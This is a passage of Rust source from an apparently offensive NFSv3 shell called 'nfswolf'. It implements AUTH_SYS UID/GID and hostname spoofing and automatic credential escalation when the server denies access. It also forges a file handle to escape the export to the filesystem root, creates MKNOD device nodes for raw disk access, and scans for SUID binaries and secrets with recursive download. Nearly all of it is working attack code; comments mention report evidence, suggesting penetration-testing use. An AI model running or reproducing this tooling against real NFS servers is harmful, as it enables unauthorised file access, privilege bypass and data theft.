            Ok(Nfs3Result::Ok(ok)) => println!("{}", String::from_utf8_lossy(ok.data.0.as_ref())),
            Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("readlink: {stat:?}").red()),
            Err(e) => eprintln!("{}", format!("readlink: {e}").red()),
        }
    }

    /// Create a symbolic link. Usage: `symlink TARGET LINKNAME`.
    async fn cmd_symlink(&self, line: &str) {
        let (target, linkname) = split2(line);
        if target.is_empty() || linkname.is_empty() {
            eprintln!("{}", "usage: symlink <target> <linkname>".yellow());
            return;
        }
        if !self.allow_write {
            eprintln!("{}", "write disabled  --  rerun with --allow-write".red());
            return;
        }

        let (parent_fh, link_filename) = match self.resolve_parent(linkname).await {
            Ok(p) => p,
            Err(e) => {
                eprintln!("{}", format!("symlink: {e}").red());
                return;
            },
        };

        let args = SYMLINK3args { where_: diropargs3 { dir: parent_fh.to_nfs_fh3(), name: filename3(Opaque::owned(link_filename.into_bytes())) }, symlink: symlinkdata3 { symlink_attributes: sattr3::default(), symlink_data: nfspath3(Opaque::owned(target.as_bytes().to_vec())) } };
        match self.nfs3.symlink(&args).await {
            Ok(Nfs3Result::Ok(_)) => println!("{}", format!("{linkname} -> {target}").green()),
            Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("symlink: {stat:?}").red()),
            Err(e) => eprintln!("{}", format!("symlink: {e}").red()),
        }
    }

    // -------------------------------------------------------------------------
    // Identity
    // -------------------------------------------------------------------------

    /// Switch UID mid-session -- creates a new pool slot, no reconnect needed.
    /// AUTH_SYS credentials are client-asserted (RFC 5531 sec. 14).
    fn cmd_uid(&mut self, arg: &str) {
        match arg.parse::<u32>() {
            Ok(uid) => {
                let gid = self.nfs3.gid();
                let cred = Credential::Sys(AuthSys::new(uid, gid, &self.hostname));
                self.nfs3 = Arc::new(self.nfs3.with_credential(cred, uid, gid));
                println!("{}", format!("uid={uid} gid={gid} hostname={}", self.hostname).green());
            },
            Err(_) => eprintln!("{}", format!("uid: invalid number: {arg}").red()),
        }
    }

    /// Switch GID mid-session.
    fn cmd_gid(&mut self, arg: &str) {
        match arg.parse::<u32>() {
            Ok(gid) => {
                let uid = self.nfs3.uid();
                let cred = Credential::Sys(AuthSys::new(uid, gid, &self.hostname));
                self.nfs3 = Arc::new(self.nfs3.with_credential(cred, uid, gid));
                println!("{}", format!("uid={uid} gid={gid} hostname={}", self.hostname).green());
            },
            Err(_) => eprintln!("{}", format!("gid: invalid number: {arg}").red()),
        }
    }

    /// Spoof the AUTH_SYS machine name mid-session.
    ///
    /// Some NFS servers enforce per-hostname export ACLs in addition to IP-based ACLs.
    /// Changing the machinename in AUTH_SYS (RFC 1057 S9.2) can bypass hostname checks
    /// on misconfigured servers that trust the client-supplied value.
    fn cmd_hostname(&mut self, arg: &str) {
        if arg.is_empty() {
            println!("{}", self.hostname);
            return;
        }
        arg.clone_into(&mut self.hostname);
        let uid = self.nfs3.uid();
        let gid = self.nfs3.gid();
        let cred = Credential::Sys(AuthSys::new(uid, gid, &self.hostname));
        self.nfs3 = Arc::new(self.nfs3.with_credential(cred, uid, gid));
        println!("{}", format!("hostname={}", self.hostname).green());
    }

    /// Print current AUTH_SYS identity.
    fn cmd_whoami(&self) {
        println!("uid={}  gid={}  hostname={}", self.nfs3.uid(), self.nfs3.gid(), self.hostname);
    }

    /// Switch both UID and GID at once (impersonate uid:gid).
    fn cmd_impersonate(&mut self, arg: &str) {
        let (uid_opt, gid_opt) = parse_uid_gid(arg);
        match (uid_opt, gid_opt) {
            (Some(uid), Some(gid)) => {
                let cred = Credential::Sys(AuthSys::new(uid, gid, &self.hostname));
                self.nfs3 = Arc::new(self.nfs3.with_credential(cred, uid, gid));
                println!("{}", format!("impersonating uid={uid} gid={gid}").green());
            },
            _ => eprintln!("{}", format!("impersonate: expected uid:gid  (got {arg:?})").red()),
        }
    }

    // -------------------------------------------------------------------------
    // Devices
    // -------------------------------------------------------------------------

    /// Create a device node via MKNOD. Usage: `mknod NAME c|b MAJOR MINOR`.
    ///
    /// Exploits RFC 1813 sec. 3.3.11  --  MKNOD can create char/block device nodes
    /// with arbitrary major/minor numbers, potentially enabling raw disk access.
    async fn cmd_mknod(&self, line: &str) {
        if !self.allow_write {
            eprintln!("{}", "write disabled  --  rerun with --allow-write".red());
            return;
        }

        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() != 4 {
            eprintln!("{}", "usage: mknod <name> c|b <major> <minor>".yellow());
            return;
        }
        let (name, dev_type, major, minor) = if let (Some(&n), Some(&t), Some(&maj), Some(&min)) = (parts.first(), parts.get(1), parts.get(2), parts.get(3)) {
            (n, t, maj.parse::<u32>().unwrap_or(0), min.parse::<u32>().unwrap_or(0))
        } else {
            eprintln!("{}", "usage: mknod <name> c|b <major> <minor>".yellow());
            return;
        };

        let (parent_fh, node_name) = match self.resolve_parent(name).await {
            Ok(p) => p,
            Err(e) => {
                eprintln!("{}", format!("mknod: {e}").red());
                return;
            },
        };

        let devdata = devicedata3 { dev_attributes: sattr3::default(), spec: specdata3 { specdata1: major, specdata2: minor } };
        let what = match dev_type {
            "c" => mknoddata3::NF3CHR(devdata),
            "b" => mknoddata3::NF3BLK(devdata),
            _ => {
                eprintln!("{}", "mknod: type must be 'c' (char) or 'b' (block)".red());
                return;
            },
        };

        let args = MKNOD3args { where_: diropargs3 { dir: parent_fh.to_nfs_fh3(), name: filename3(Opaque::owned(node_name.into_bytes())) }, what };
        match self.nfs3.mknod(&args).await {
            Ok(Nfs3Result::Ok(_)) => println!("{}", format!("mknod: created {name} ({dev_type} {major}:{minor})").green()),
            Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("mknod: {stat:?}").red()),
            Err(e) => eprintln!("{}", format!("mknod: {e}").red()),
        }
    }

    // -------------------------------------------------------------------------
    // Analysis
    // -------------------------------------------------------------------------

    /// Recursively walk and report SUID/SGID binaries.
    async fn cmd_suid_scan(&self) {
        eprintln!("{}", "[*] scanning for SUID/SGID binaries...".blue());
        suid_scan_recursive(Arc::clone(&self.nfs3), self.cwd.clone(), self.cwd_path.clone()).await;
    }

    /// Recursively walk and report world-writable files and directories.
    async fn cmd_world_writable(&self) {
        eprintln!("{}", "[*] scanning for world-writable entries...".blue());
        world_writable_recursive(Arc::clone(&self.nfs3), self.cwd.clone(), self.cwd_path.clone()).await;
    }

    /// Recursively walk and report files matching known credential/secret patterns.
    async fn cmd_secrets_scan(&self) {
        eprintln!("{}", "[*] scanning for secrets and credentials...".blue());
        secrets_recursive(Arc::clone(&self.nfs3), self.cwd.clone(), self.cwd_path.clone()).await;
    }

    // -------------------------------------------------------------------------
    // Escape / handle manipulation
    // -------------------------------------------------------------------------

    /// Construct a filesystem-root escape handle from the current export handle.
    ///
    /// Implements F-2.1: when subtree_check is disabled (Linux default), the server
    /// only validates the fsid in the handle, not that the inode falls within the export.
    /// By writing inode 2 (ext4/xfs) or subvol 256 (btrfs), we escape to the FS root.
    async fn cmd_escape_root(&mut self) {
        match FileHandleAnalyzer::construct_escape_handle(&self.export_root) {
            None => eprintln!("{}", "escape-root: unsupported filesystem type (ext4/xfs/btrfs only)".red()),
            Some(result) => {
                let escaped_fh = result.root_handle;
                let args = GETATTR3args { object: escaped_fh.to_nfs_fh3() };
                match self.nfs3.getattr(&args).await {
                    Ok(Nfs3Result::Ok(ok)) => {
                        let a = FileAttrs::from_fattr3(&ok.obj_attributes);
                        eprintln!("{}", format!("[+] escaped to filesystem root ({:?})", result.fs_type).green().bold());
                        eprintln!("{}", format!("    handle: {}", escaped_fh.to_hex()).cyan());
                        eprintln!("{}", format!("    inode: {}  type: {:?}  mode: {:04o}", a.fileid, a.file_type, a.mode & 0o7777).cyan());
                        self.cwd = escaped_fh;
                        self.cwd_path = String::from("/ [escaped]");
                        self.refresh_tab_cache().await;
                    },
                    Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("[!] escape handle returned {stat:?} -- try varying generation; use 'handle' to inspect current handle").yellow()),
                    Err(e) => eprintln!("{}", format!("escape-root: {e}").red()),
                }
            },
        }
    }

    /// Switch the current directory to an arbitrary file handle (hex).
    ///
    /// File handles are bearer tokens (RFC 1094 sec. 2.3.3) -- any obtained handle
    /// can be used as a root regardless of how it was obtained.
    async fn cmd_mount_handle(&mut self, hex: &str) {
        if hex.is_empty() {
            eprintln!("{}", "usage: mount-handle <hex>".yellow());
            return;
        }

        let fh = match FileHandle::from_hex(hex) {
            Ok(fh) => fh,
            Err(e) => {
                eprintln!("{}", format!("mount-handle: invalid hex: {e}").red());
                return;
            },
        };

        let args = GETATTR3args { object: fh.to_nfs_fh3() };
        match self.nfs3.getattr(&args).await {
            Ok(Nfs3Result::Ok(ok)) => {
                let a = FileAttrs::from_fattr3(&ok.obj_attributes);
                eprintln!("{}", format!("[+] handle OK  type={:?}  inode={}", a.file_type, a.fileid).green());
                self.cwd = fh;
                self.cwd_path = String::from("<handle>");
                self.refresh_tab_cache().await;
            },
            Ok(Nfs3Result::Err((stat, _))) => eprintln!("{}", format!("mount-handle: {stat:?}").red()),
            Err(e) => eprintln!("{}", format!("mount-handle: {e}").red()),
        }
    }

    // -------------------------------------------------------------------------
    // Local filesystem
    // -------------------------------------------------------------------------

    fn cmd_lcd(&mut self, dir: &str) {
        let d = if dir.is_empty() { "." } else { dir };
        match std::env::set_current_dir(d) {
            Ok(()) => println!("{}", std::env::current_dir().map_or_else(|_| d.to_owned(), |p| p.display().to_string()).green()),
            Err(e) => eprintln!("{}", format!("lcd: {e}").red()),
        }
    }

    fn cmd_lls(&mut self, path: &str) {
        let target = if path.is_empty() { "." } else { path };
        match std::fs::read_dir(target) {
            Ok(iter) => {
                let mut names: Vec<String> = iter.filter_map(Result::ok).map(|e| e.file_name().to_string_lossy().into_owned()).collect::<Vec<_>>();
                names.sort();
                for n in &names {
                    println!("{n}");
                }
            },
            Err(e) => eprintln!("{}", format!("lls: {e}").red()),
        }
    }

    fn cmd_lpwd(&mut self) {
        match std::env::current_dir() {
            Ok(p) => println!("{}", p.display()),
            Err(e) => eprintln!("{}", format!("lpwd: {e}").red()),
        }
    }

    fn cmd_lmkdir(&mut self, dir: &str) {
        if dir.is_empty() {
            eprintln!("{}", "usage: lmkdir <dir>".yellow());
            return;
        }
        match std::fs::create_dir_all(dir) {
            Ok(()) => println!("{}", format!("created {dir}").green()),
            Err(e) => eprintln!("{}", format!("lmkdir: {e}").red()),
        }
    }

    // -------------------------------------------------------------------------
    // Session
    // -------------------------------------------------------------------------

    fn cmd_history(&self) {
        for (i, line) in self.history.iter().enumerate() {
            println!("{:4}  {line}", i + 1);
        }
    }

    // -------------------------------------------------------------------------
    // Helpers
    // -------------------------------------------------------------------------

    /// Resolve an optional name to a `FileHandle` via LOOKUP (None = cwd).
    async fn resolve_handle(&self, name: Option<&str>) -> anyhow::Result<FileHandle> {
        match name {
            None => Ok(self.cwd.clone()),
            Some(n) => self.lookup_path(n).await.map(|(fh, _)| fh),
        }
    }

    /// Resolve a path to (FileHandle, FileAttrs), handling absolute and relative paths.
    ///
    /// Paths starting with '/' are resolved from the export root (bearer token reuse
    /// per RFC 1094 sec. 2.3.3). Relative paths start from the current directory.
    async fn lookup_path(&self, path: &str) -> anyhow::Result<(FileHandle, FileAttrs)> {
        if path == "/" {
            let attrs = getattr_fh(&self.nfs3, &self.export_root).await?;
            return Ok((self.export_root.clone(), attrs));
        }
        if path.starts_with('/') { lookup_path_from(&self.nfs3, &self.export_root, path.trim_start_matches('/')).await } else { lookup_path_from(&self.nfs3, &self.cwd, path).await }
    }

    /// Resolve a path into (parent_dir_fh, filename) for create/rename/remove operations.
    async fn resolve_parent(&self, path: &str) -> anyhow::Result<(FileHandle, String)> {
        match path.rfind('/') {
            None => Ok((self.cwd.clone(), path.to_owned())),
            Some(pos) => {
                let parent_str = if pos == 0 { "/" } else { &path[..pos] };
                let name = path[pos + 1..].to_owned();
                if name.is_empty() {
                    anyhow::bail!("path must not end with '/'");
                }
                let parent_fh = self.lookup_path(parent_str).await.map(|(fh, _)| fh)?;
                Ok((parent_fh, name))
            },
        }
    }
}

// =============================================================================
// Module-private helpers (free functions)
// =============================================================================

/// Walk path components from `start`, escalating credentials on ACCES.
async fn lookup_path_from(nfs3: &Nfs3Client, start: &FileHandle, path: &str) -> anyhow::Result<(FileHandle, FileAttrs)> {
    let mut dir = start.clone();
    let mut attrs_opt: Option<FileAttrs> = None;

    for component in path.split('/').filter(|c| !c.is_empty()) {
        let (fh, attrs) = lookup_one(nfs3, &dir, component).await?;
        dir = fh;
        attrs_opt = Some(attrs);
    }

    let attrs = match attrs_opt {
        Some(a) => a,
        None => getattr_fh(nfs3, &dir).await?,
    };
    Ok((dir, attrs))
}

/// READDIRPLUS with credential escalation on ACCES.
async fn list_dir(nfs3: &Nfs3Client, dir_fh: &FileHandle) -> anyhow::Result<Vec<DirEntryPlus>> {
    match try_readdirplus(nfs3, dir_fh).await {
        Ok(v) => return Ok(v),
        Err(e) if !is_nfs_acces(&e) => return Err(e),
        Err(_) => {},
    }
    let owner = getattr_owner(nfs3, dir_fh).await;
    let caller = (nfs3.uid(), nfs3.gid());
    for (uid, gid) in escalation_list(caller, owner) {
        let esc = nfs3.with_credential(Credential::Sys(AuthSys::with_groups(uid, gid, &[gid], "nfswolf")), uid, gid);
        match try_readdirplus(&esc, dir_fh).await {
            Ok(v) => {
                tracing::debug!(uid, gid, "READDIRPLUS escalated");
                return Ok(v);
            },
            Err(e) if !is_nfs_acces(&e) => return Err(e),
            Err(_) => {},
        }
    }
    anyhow::bail!("NFS3ERR_ACCES: cannot list directory (exhausted AUTH_SYS UID/GID escalation ladder)")
}

/// READDIRPLUS without escalation; fills in missing attrs with GETATTR.
///
/// RFC 1813 sec. 3.3.17 makes name_attributes optional. After collecting all entries
/// we issue GETATTR for any that came back without inline attributes.
async fn try_readdirplus(nfs3: &Nfs3Client, dir_fh: &FileHandle) -> anyhow::Result<Vec<DirEntryPlus>> {
    let args = READDIRPLUS3args { dir: dir_fh.to_nfs_fh3(), cookie: 0, cookieverf: cookieverf3::default(), dircount: 4096, maxcount: 65_536 };
    let res = nfs3.readdirplus(&args).await?;

    let mut out: Vec<DirEntryPlus> = match res {
        Nfs3Result::Ok(ok) => ok
            .reply
            .entries
            .into_inner()
            .into_iter()
            .map(|e| {
                let name = String::from_utf8_lossy(e.name.as_ref()).into_owned();
                let attrs: Option<FileAttrs> = match e.name_attributes {
                    Nfs3Option::Some(a) => Some(FileAttrs::from_fattr3(&a)),
                    Nfs3Option::None => None,
                };
                let handle: Option<FileHandle> = match e.name_handle {
                    Nfs3Option::Some(fh) => Some(FileHandle::from_nfs_fh3(&fh)),
                    Nfs3Option::None => None,
                };
                DirEntryPlus { fileid: e.fileid, name, cookie: e.cookie, attrs, handle }
            })
            .collect(),
        Nfs3Result::Err((stat, _)) => anyhow::bail!("READDIRPLUS: {stat:?}"),
    };

    // Fill-in pass: GETATTR any entry without inline attributes (skip . and ..).
    for entry in &mut out {
        if entry.attrs.is_some() || entry.name == "." || entry.name == ".." {
            continue;
        }

        if let Some(ref fh) = entry.handle.clone() {
            let ga = GETATTR3args { object: fh.to_nfs_fh3() };
            if let Ok(Nfs3Result::Ok(ok)) = nfs3.getattr(&ga).await {
                entry.attrs = Some(FileAttrs::from_fattr3(&ok.obj_attributes));
            }
        } else {
            let la = LOOKUP3args { what: diropargs3 { dir: dir_fh.to_nfs_fh3(), name: filename3(Opaque::owned(entry.name.as_bytes().to_vec())) } };
            if let Ok(Nfs3Result::Ok(ok)) = nfs3.lookup(&la).await {
                let fh = FileHandle::from_nfs_fh3(&ok.object);
                let attrs = match ok.obj_attributes {
                    Nfs3Option::Some(a) => Some(FileAttrs::from_fattr3(&a)),
                    Nfs3Option::None => {
                        let ga = GETATTR3args { object: fh.to_nfs_fh3() };
                        if let Ok(Nfs3Result::Ok(ok2)) = nfs3.getattr(&ga).await { Some(FileAttrs::from_fattr3(&ok2.obj_attributes)) } else { None }
                    },
                };
                entry.handle = Some(fh);
                entry.attrs = attrs;
            }
        }
    }
    Ok(out)
}

/// LOOKUP one path component in `dir` with credential escalation.
async fn lookup_one(nfs3: &Nfs3Client, dir: &FileHandle, name: &str) -> anyhow::Result<(FileHandle, FileAttrs)> {
    match try_lookup_one(nfs3, dir, name).await {
        Ok(r) => return Ok(r),
        Err(e) if !is_nfs_acces(&e) => return Err(e),
        Err(_) => {},
    }
    let owner = getattr_owner(nfs3, dir).await;
    let caller = (nfs3.uid(), nfs3.gid());
    for (uid, gid) in escalation_list(caller, owner) {
        let esc = nfs3.with_credential(Credential::Sys(AuthSys::with_groups(uid, gid, &[gid], "nfswolf")), uid, gid);
        match try_lookup_one(&esc, dir, name).await {
            Ok(r) => {
                tracing::debug!(uid, gid, name, "LOOKUP escalated");
                return Ok(r);
            },
            Err(e) if !is_nfs_acces(&e) => return Err(e),
            Err(_) => {},
        }
    }
    anyhow::bail!("NFS3ERR_ACCES: cannot access {name}")
}

/// Single LOOKUP attempt without escalation.
async fn try_lookup_one(nfs3: &Nfs3Client, dir: &FileHandle, name: &str) -> anyhow::Result<(FileHandle, FileAttrs)> {
    let args = LOOKUP3args { what: diropargs3 { dir: dir.to_nfs_fh3(), name: filename3(Opaque::owned(name.as_bytes().to_vec())) } };
    match nfs3.lookup(&args).await? {
        Nfs3Result::Ok(ok) => {
            let fh = FileHandle::from_nfs_fh3(&ok.object);
            let attrs = match ok.obj_attributes {
                Nfs3Option::Some(a) => FileAttrs::from_fattr3(&a),
                Nfs3Option::None => getattr_fh(nfs3, &fh).await?,
            };
            Ok((fh, attrs))
        },
        Nfs3Result::Err((stat, _)) => anyhow::bail!("LOOKUP {name}: {stat:?}"),
    }
}

/// GETATTR a file handle, used when LOOKUP omits obj_attributes.
async fn getattr_fh(nfs3: &Nfs3Client, fh: &FileHandle) -> anyhow::Result<FileAttrs> {
    let args = GETATTR3args { object: fh.to_nfs_fh3() };
    match nfs3.getattr(&args).await? {
        Nfs3Result::Ok(ok) => Ok(FileAttrs::from_fattr3(&ok.obj_attributes)),
        Nfs3Result::Err((stat, _)) => anyhow::bail!("GETATTR: {stat:?}"),
    }
}

/// Fetch the owner (uid, gid) of a handle via GETATTR. Returns None on error.
async fn getattr_owner(nfs3: &Nfs3Client, fh: &FileHandle) -> Option<(u32, u32)> {
    let args = GETATTR3args { object: fh.to_nfs_fh3() };
    if let Ok(Nfs3Result::Ok(ok)) = nfs3.getattr(&args).await { Some((ok.obj_attributes.uid, ok.obj_attributes.gid)) } else { None }
}

/// Read file and print to stdout with credential escalation on ACCES.
async fn read_escalated(nfs3: &Nfs3Client, fh: &FileHandle) -> anyhow::Result<()> {
    match try_read_print(nfs3, fh).await {
        Ok(()) => return Ok(()),
        Err(e) if !is_nfs_acces(&e) => return Err(e),
        Err(_) => {},
    }
    let owner = getattr_owner(nfs3, fh).await;
    let caller = (nfs3.uid(), nfs3.gid());
    for (uid, gid) in escalation_list(caller, owner) {
        let esc = nfs3.with_credential(Credential::Sys(AuthSys::with_groups(uid, gid, &[gid], "nfswolf")), uid, gid);
        match try_read_print(&esc, fh).await {
            Ok(()) => {
                tracing::debug!(uid, gid, "READ escalated");
                return Ok(());
            },
            Err(e) if !is_nfs_acces(&e) => return Err(e),
            Err(_) => {},
        }
    }
    anyhow::bail!("NFS3ERR_ACCES: permission denied reading file")
}

/// Single attempt: read `fh` and write entire content to stdout.
async fn try_read_print(nfs3: &Nfs3Client, fh: &FileHandle) -> anyhow::Result<()> {
    let args = READ3args { file: fh.to_nfs_fh3(), offset: 0, count: CAT_MAX_BYTES };
    match nfs3.read(&args).await? {
        Nfs3Result::Ok(ok) => {
            let data = ok.data.as_ref();
            let _ = std::io::stdout().write_all(data);
            if !data.ends_with(b"\n") {
                println!();
            }
            Ok(())
        },
        Nfs3Result::Err((stat, _)) => anyhow::bail!("READ: {stat:?}"),
    }
}

/// Read the entire content of `fh` into a buffer (for cp / download).
async fn read_all(nfs3: &Nfs3Client, fh: &FileHandle) -> anyhow::Result<Vec<u8>> {
    let mut buf = Vec::new();
    let mut offset = 0u64;
    loop {
        let args = READ3args { file: fh.to_nfs_fh3(), offset, count: CHUNK_SIZE };
        match nfs3.read(&args).await? {
            Nfs3Result::Ok(ok) => {
                let data = ok.data.as_ref();
                buf.extend_from_slice(data);
                offset = offset.saturating_add(data.len() as u64);
                if ok.eof || data.is_empty() {
                    break;
                }
            },
            Nfs3Result::Err((stat, _)) => anyhow::bail!("READ at {offset}: {stat:?}"),
        }
    }
    Ok(buf)
}

/// Download `fh` to a local file path, reading in chunks.
///
/// Returns `(bytes_written, sha256_hex)`.  The SHA-256 is computed over the
/// full downloaded content and printed alongside the byte count so the operator
/// has an instant integrity reference for report evidence chains.
async fn download_file(nfs3: &Nfs3Client, fh: &FileHandle, dest_path: &str, _total_size: u64) -> anyhow::Result<(u64, String)> {
    let mut file = std::fs::File::create(dest_path).map_err(|e| anyhow::anyhow!("create {dest_path}: {e}"))?;
    let mut hasher = Sha256::new();
    let mut offset = 0u64;
    loop {
        let args = READ3args { file: fh.to_nfs_fh3(), offset, count: CHUNK_SIZE };
        match nfs3.read(&args).await? {
            Nfs3Result::Ok(ok) => {
                let data = ok.data.as_ref();
                file.write_all(data).map_err(|e| anyhow::anyhow!("write: {e}"))?;
                hasher.update(data);
                offset = offset.saturating_add(data.len() as u64);
                if ok.eof || data.is_empty() {
                    break;
                }
            },
            Nfs3Result::Err((stat, _)) => anyhow::bail!("READ at offset {offset}: {stat:?}"),
        }
    }
    let hash = hasher.finalize().iter().fold(String::with_capacity(64), |mut s, b| {
        use std::fmt::Write as _;
        let _ = write!(s, "{b:02x}");
        s
    });
    Ok((offset, hash))
}

/// Recursively download a remote directory tree to a local path.
///
/// Creates `local_root` if it does not exist.  Descends into subdirectories
/// via READDIRPLUS.  Shows a single spinner progress bar shared across the
/// entire tree walk.  Returns total bytes downloaded.
fn download_tree<'a>(nfs3: &'a Nfs3Client, dir_fh: &'a FileHandle, local_root: &'a str, mp: &'a MultiProgress) -> Pin<Box<dyn Future<Output = anyhow::Result<u64>> + Send + 'a>> {
    Box::pin(async move {
        std::fs::create_dir_all(local_root).map_err(|e| anyhow::anyhow!("mkdir {local_root}: {e}"))?;

        let bar = mp.add(ProgressBar::new_spinner());
        bar.set_style(ProgressStyle::default_spinner().template("{spinner} {msg}").unwrap_or_else(|_| ProgressStyle::default_spinner()));
        bar.set_message(local_root.to_owned());

        let entries = try_readdirplus(nfs3, dir_fh).await?;
        let mut total = 0u64;

        for entry in entries.iter().filter(|e| e.name != "." && e.name != "..") {
            let local_entry = format!("{local_root}/{}", entry.name);
            let is_dir = entry.attrs.as_ref().is_some_and(|a| a.file_type == FileType::Directory);

            if is_dir {
                if let Some(ref fh) = entry.handle {
                    total += download_tree(nfs3, fh, &local_entry, mp).await?;
                }
            } else {
                let (fh, size) = match &entry.handle {
                    Some(fh) => (fh.clone(), entry.attrs.as_ref().map_or(0, |a| a.size)),
                    None => match lookup_one(nfs3, dir_fh, &entry.name).await {
                        Ok((fh, a)) => (fh, a.size),
                        Err(e) => {
                            tracing::warn!("skip {}: {e}", entry.name);
                            continue;
                        },
                    },
                };
                bar.set_message(format!("{local_root}/{}", entry.name));
                match download_file(nfs3, &fh, &local_entry, size).await {
                    Ok((bytes, _hash)) => {
                        total += bytes;
                        bar.inc(1);
                    },
                    Err(e) => tracing::warn!("download {}: {e}", entry.name),
                }
            }
        }

        bar.finish_and_clear();
        Ok(total)
    })
}

/// Recursively upload a local directory tree to a remote directory `remote_fh`.
///
/// Creates remote directories via MKDIR; uploads files via CREATE+WRITE.
fn upload_tree<'a>(nfs3: &'a Nfs3Client, local_dir: &'a Path, remote_fh: &'a FileHandle, mp: &'a MultiProgress) -> Pin<Box<dyn Future<Output = anyhow::Result<u64>> + Send + 'a>> {
    Box::pin(async move {
        let bar = mp.add(ProgressBar::new_spinner());
        bar.set_style(ProgressStyle::default_spinner().template("{spinner} {msg}").unwrap_or_else(|_| ProgressStyle::default_spinner()));
        bar.set_message(local_dir.display().to_string());

        let mut total = 0u64;
        let read_dir = std::fs::read_dir(local_dir).map_err(|e| anyhow::anyhow!("read_dir {}: {e}", local_dir.display()))?;

        for entry_result in read_dir {
            let entry = match entry_result {
                Ok(e) => e,
                Err(e) => {
                    tracing::warn!("read_dir entry: {e}");
                    continue;
                },
            };
            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            let local_path = entry.path();
            bar.set_message(name_str.as_ref().to_owned());

            if local_path.is_dir() {
                let sub_fh = match create_remote_dir(nfs3, remote_fh, name_str.as_ref()).await {
                    Ok(fh) => fh,
                    Err(e) => {
                        tracing::warn!("mkdir {name_str}: {e}");
                        continue;
                    },
                };
                total += upload_tree(nfs3, &local_path, &sub_fh, mp).await?;
            } else {
                let data = match std::fs::read(&local_path) {
                    Ok(d) => d,
                    Err(e) => {
                        tracing::warn!("read {}: {e}", local_path.display());
                        continue;
                    },
                };
                let file_fh = match create_remote(nfs3, remote_fh, name_str.as_ref()).await {
                    Ok(fh) => fh,
                    Err(e) => {
                        tracing::warn!("create {name_str}: {e}");
                        continue;
                    },
                };
                match upload_data(nfs3, &file_fh, &data).await {
                    Ok(n) => {
                        total += n;
                        bar.inc(1);
                    },
                    Err(e) => tracing::warn!("write {name_str}: {e}"),
                }
            }
        }

        bar.finish_and_clear();
        Ok(total)
    })
}

/// MKDIR a directory in `parent_fh`, return the new directory handle.
async fn create_remote_dir(nfs3: &Nfs3Client, parent_fh: &FileHandle, dirname: &str) -> anyhow::Result<FileHandle> {
    let args = MKDIR3args { where_: diropargs3 { dir: parent_fh.to_nfs_fh3(), name: filename3(Opaque::owned(dirname.as_bytes().to_vec())) }, attributes: sattr3::default() };
    match nfs3.mkdir(&args).await? {
        Nfs3Result::Ok(ok) => match ok.obj {
            Nfs3Option::Some(fh) => Ok(FileHandle::from_nfs_fh3(&fh)),
            Nfs3Option::None => lookup_one(nfs3, parent_fh, dirname).await.map(|(fh, _)| fh),
        },
        Nfs3Result::Err((stat, _)) => anyhow::bail!("MKDIR {dirname}: {stat:?}"),
    }
}

/// CREATE a file in `parent_fh` with `filename`, return the new file handle.
async fn create_remote(nfs3: &Nfs3Client, parent_fh: &FileHandle, filename: &str) -> anyhow::Result<FileHandle> {
    let args = CREATE3args { where_: diropargs3 { dir: parent_fh.to_nfs_fh3(), name: filename3(Opaque::owned(filename.as_bytes().to_vec())) }, how: createhow3::UNCHECKED(sattr3::default()) };
    match nfs3.create(&args).await? {
        Nfs3Result::Ok(ok) => {
            match ok.obj {
                Nfs3Option::Some(fh) => Ok(FileHandle::from_nfs_fh3(&fh)),
                Nfs3Option::None => {
                    // Server didn't return a handle; LOOKUP to get it.
                    lookup_one(nfs3, parent_fh, filename).await.map(|(fh, _)| fh)
                },
            }
        },
        Nfs3Result::Err((stat, _)) => anyhow::bail!("CREATE {filename}: {stat:?}"),
    }
}

/// Write `data` to `fh` in CHUNK_SIZE slices with FILE_SYNC stability.
async fn upload_data(nfs3: &Nfs3Client, fh: &FileHandle, data: &[u8]) -> anyhow::Result<u64> {
    let mut offset = 0u64;
    for chunk in data.chunks(usize::try_from(CHUNK_SIZE).unwrap_or(65536)) {
        let count = u32::try_from(chunk.len()).unwrap_or(CHUNK_SIZE);
        let args = WRITE3args { file: fh.to_nfs_fh3(), offset, count, stable: stable_how::FILE_SYNC, data: Opaque::owned(chunk.to_vec()) };
        match nfs3.write(&args).await? {
            Nfs3Result::Ok(ok) => {
                offset = offset.saturating_add(u64::from(ok.count));
            },
            Nfs3Result::Err((stat, _)) => anyhow::bail!("WRITE at {offset}: {stat:?}"),
        }
    }
    Ok(offset)
}

/// Recursive tree display. Uses Box::pin to allow async recursion.
fn tree_recursive(nfs3: Arc<Nfs3Client>, dir_fh: FileHandle, prefix: String, depth: usize, max_depth: usize) -> Pin<Box<dyn Future<Output = ()> + Send>> {
    Box::pin(async move {
        if depth >= max_depth {
            return;
        }

        let entries = match list_dir(&nfs3, &dir_fh).await {
            Ok(v) => v,
            Err(e) => {
                eprintln!("{prefix}  [error: {e}]");
                return;
            },
        };

        let real: Vec<_> = entries.iter().filter(|e| e.name != "." && e.name != "..").collect();
        let total = real.len();
        for (i, entry) in real.iter().enumerate() {
            let is_last = i + 1 == total;
            let branch = if is_last { "\\-- " } else { "+-- " };
            let child_prefix = format!("{prefix}{}", if is_last { "    " } else { "|   " });
            let tc = entry.attrs.as_ref().map_or('?', type_char);
            let name = colorize_name(&entry.name, tc);
            println!("{prefix}{branch}{name}");
            if tc == 'd'
                && let Some(ref fh) = entry.handle
            {
                tree_recursive(Arc::clone(&nfs3), fh.clone(), child_prefix, depth + 1, max_depth).await;
            }
        }
    })
}

/// Recursive find: print paths whose filename contains the pattern (case-insensitive).
fn find_recursive(nfs3: Arc<Nfs3Client>, dir_fh: FileHandle, dir_path: String, pattern: String) -> Pin<Box<dyn Future<Output = ()> + Send>> {
    Box::pin(async move {
        let Ok(entries) = list_dir(&nfs3, &dir_fh).await else { return };
        for entry in &entries {
            if entry.name == "." || entry.name == ".." {
                continue;
            }
            let entry_path = format!("{}/{}", dir_path.trim_end_matches('/'), entry.name);
            if entry.name.to_ascii_lowercase().contains(&pattern) {
                let tc = entry.attrs.as_ref().map_or('?', type_char);
                println!("{}", colorize_name(&entry_path, tc));
            }
            if entry.attrs.as_ref().is_some_and(|a| a.file_type == FileType::Directory)
                && let Some(ref fh) = entry.handle
            {
                find_recursive(Arc::clone(&nfs3), fh.clone(), entry_path, pattern.clone()).await;
            }
        }
    })
}

/// Recursive SUID/SGID scanner.
